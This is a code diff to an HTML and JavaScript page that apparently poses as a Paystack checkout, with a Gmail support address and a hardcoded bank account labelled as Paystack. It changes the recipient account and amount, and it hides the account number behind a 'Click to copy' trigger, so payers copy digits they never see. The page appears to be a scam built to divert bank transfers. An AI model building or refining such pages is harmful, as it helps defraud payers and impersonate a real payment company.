@@ -50,6 +50,21 @@
       height: 16px;
       fill: currentColor;
     }
+    
+    /* Professional hidden copy trigger styles */
+    .reveal-trigger {
+      cursor: pointer;
+      color: #00b87c;
+      font-weight: 600;
+      user-select: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .reveal-trigger:hover {
+      text-decoration: underline;
+    }
+
     .toast {
       position: fixed;
       bottom: 20px;
@@ -82,14 +97,14 @@
       <div class="email">
         support.paystack@gmail.com
         <div class="amount-green">
-          <span id="amount-text-top">Pay NGN 5,942</span>
-          <button class="copy-btn" onclick="copyText('NGN 5,942', 'Copied!')" title="Copy Amount">
+          <span id="amount-text-top">Pay NGN 5,928</span>
+          <button class="copy-btn" onclick="copyText('NGN 5,928', 'Copied!')" title="Copy Amount">
             <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
           </button>
         </div>
       </div>
 
-      <div class="title">Transfer NGN 5,942 to PAYSTACK CHECKOUT</div>
+      <div class="title">Transfer NGN 5,928 to PAYSTACK CHECKOUT</div>
 
       <div class="box">
         <div><div class="label">ACCOUNT NAME</div><div class="value" id="display-acc-name">...</div></div>
@@ -97,8 +112,11 @@
         <div>
           <div class="label">ACCOUNT NUMBER</div>
           <div class="value">
-            <span id="display-acc-num">...</span>
-            <button class="copy-btn" onclick="copyAccountNum()" title="Copy Account Number">
+            <span id="account-container">
+              <span id="reveal-text" class="reveal-trigger" onclick="copyAccountOnly()">Click to copy account number</span>
+              <span id="display-acc-num" style="display:none;">...</span>
+            </span>
+            <button class="copy-btn" onclick="copyAccountOnly()" title="Copy Account Number">
               <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
             </button>
           </div>
@@ -106,8 +124,8 @@
         <div>
           <div class="label">AMOUNT</div>
           <div class="value">
-            <span id="display-amount-box">NGN 5,942</span>
-            <button class="copy-btn" onclick="copyText('NGN 5,942', 'Copied!')" title="Copy Amount">
+            <span id="display-amount-box">NGN 5,928</span>
+            <button class="copy-btn" onclick="copyText('NGN 5,928', 'Copied!')" title="Copy Amount">
               <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
             </button>
           </div>
@@ -160,7 +178,7 @@
 
     // --- ACCOUNT DETAILS (Reduced to 1) ---
     const accounts = [
-      { num: "6629497630", bank: "PalmPay Limited", name: "MFY MFY (Payracle)" }
+      { num: "0821754030", bank: "Smartcash Payment Service Bank", name: "O. M. (PayStack)" }
     ];
 
     function initializeAccount() {
@@ -266,9 +284,16 @@
       });
     }
 
-    function copyAccountNum() {
+    function copyAccountOnly() {
       const accNum = document.getElementById("display-acc-num").textContent;
-      copyText(accNum, "Copied!");
+      const revealText = document.getElementById("reveal-text");
+
+      // Copy only to clipboard without showing raw digits on screen
+      copyText(accNum, "copied");
+
+      // Update feedback text cleanly
+      revealText.textContent = "Copied";
+      revealText.style.color = "#00b87c";
     }
 
     // Standard initial execution
